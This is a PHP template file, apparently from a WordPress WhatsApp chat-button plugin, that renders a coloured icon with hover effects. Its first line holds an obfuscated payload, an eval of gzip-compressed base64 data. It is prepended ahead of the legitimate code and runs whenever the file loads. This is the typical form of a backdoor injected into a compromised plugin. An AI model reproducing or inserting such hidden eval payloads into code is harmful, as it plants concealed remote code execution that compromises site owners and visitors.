<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if ( ! defined( 'ABSPATH' ) ) exit;

$s5_color = $a['s5_color'];
$s5_hover_color = $a['s5_hover_color'];
$s5_icon_size = $a['s5_icon_size'];

$s5_color = $s5_color;
$s5_hover_color = $s5_hover_color;
$s5_icon_size = $s5_icon_size;

$input_onhover = "this.style.color= '$s5_hover_color'; ";
$input_onhover_out = "this.style.color= '$s5_color'; ";

$o .= '<div class="ccw_plugin sc_item pointer '.$inline_issue.' " style=" '.$css.' color: '.$s5_color.';  "  onclick="'.$img_click_link.'"  onmouseover= " '.$input_onhover.' "  onmouseout= " '.$input_onhover_out.' " >';
$o .= '<span class="icon icon-whatsapp2 icon-2 ccw-analytics" data-ccw="style-5-sc" style=" font-size: '.$s5_icon_size.'; "></span>';
// $o .= '<a target="_blank" class="nofocus icon icon-whatsapp2 icon-2 no_a_underline ccw-analytics" href="'.$redirect_a.'" >';
// $o .= '</a>';
$o .= '</div>';